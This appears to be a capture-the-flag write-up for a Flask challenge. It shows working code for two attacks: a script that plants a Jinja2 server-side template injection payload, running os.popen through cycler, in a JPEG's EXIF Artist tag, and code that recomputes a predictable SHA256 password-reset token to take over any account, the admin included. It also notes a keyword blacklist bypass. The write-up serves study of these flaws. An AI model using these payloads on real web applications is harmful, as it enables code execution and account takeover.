
---

## Guild CTF — SSTI + EXIF Exploitation & Password Reset Abuse

We are dealing with a Flask web application where users can upload files, and an admin user can review them. During code review, we discovered several important security issues, including Server-Side Template Injection (SSTI) and an insecure password reset mechanism.

---

### SSTI via EXIF 'Artist' Tag

In the `verify()` route, which is only accessible by the admin user, the uploaded file is opened using PIL’s `Image.open`, and EXIF metadata is extracted:

```python
img = Image.open(query.doc)

exif_table = {}
for k, v in img.getexif().items():
    tag = TAGS.get(k)
    exif_table[tag] = v

if "Artist" in exif_table.keys():
    sec_code = exif_table["Artist"]
    query.verified = 1
    db.session.commit()
    return render_template_string("Verified! {}".format(sec_code))
```

Here, the value of the `Artist` tag is injected directly into a Jinja2 template using `render_template_string()`, which makes it vulnerable to SSTI if user input is inserted into EXIF metadata.

---

### Generating a Malicious Image

To exploit this, we created a new user account and uploaded a specially crafted JPEG image with an SSTI payload in the `Artist` EXIF tag.

Below is the script we used to generate the image with embedded SSTI:

```python
from PIL import Image
import piexif
from io import BytesIO

img = Image.new("RGB", (100, 100), color='white')
img.save("tmp.jpg", format="jpeg")

payload = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
exif_dict = {"0th": {piexif.ImageIFD.Artist: payload.encode()}, "Exif": {}, "GPS": {}, "1st": {}}
exif_bytes = piexif.dump(exif_dict)

piexif.insert(exif_bytes, "tmp.jpg", "exploit.jpg")
```

We then uploaded `exploit.jpg` through the user interface.

When the admin reviews and verifies the submission, the backend extracts the EXIF `Artist` tag and renders it directly using `render_template_string`, executing the injected SSTI payload. As a result, the contents of `flag.txt` are displayed on the admin panel under the "Verified!" message.

---

### Password Reset Exploit

Another vulnerability is present in the password reset functionality. Here's the flow:

* When a user clicks “Forgot Password”, a hash of their email is generated using SHA256 and saved in the database as a reset token (`validlink`).
* The admin doesn’t need to approve it — the logic is automated.
* Anyone who knows the email can compute the hash themselves, craft the reset URL manually, and change the password without access to the original email.

We reviewed the source code and noticed this:

```python
@views.route("/forgetpassword", methods=["GET", "POST"])
def forgetpassword():
    if request.method == "POST":
        email = request.form.get("email")
        query = User.query.filter_by(email=email).first()
        flash("If email is registered then you will get a link to reset password!", category="success")
        if query:
            reset_url = str(hashlib.sha256(email.encode()).hexdigest())
            print(reset_url)
            new_query = Validlinks(email=email, validlink=reset_url)
            db.session.add(new_query)
            db.session.commit()
```

The link is generated using a predictable and non-expiring SHA256 hash of the email address. So we can regenerate it locally.

Example:

```python
import hashlib

email = "4831625453756247@master.guild"
reset_url = hashlib.sha256(email.encode()).hexdigest()
print(reset_url)
```

We visit `/changepasswd/<hash>` with this value, set a new password, and gain access to that account — including the admin if their email is known.

---

### Conclusion

This challenge combines multiple issues:

* **SSTI via EXIF metadata**, where arbitrary code execution is possible by injecting Jinja2 into image metadata.
* **Weak password reset**, allowing unauthorized reset of any account by knowing the email address.
* A blacklist that tries to block dangerous keywords, but can be bypassed using template tricks or indirect access (e.g., via `cycler`).

Both attack vectors together allow full compromise of the web application.
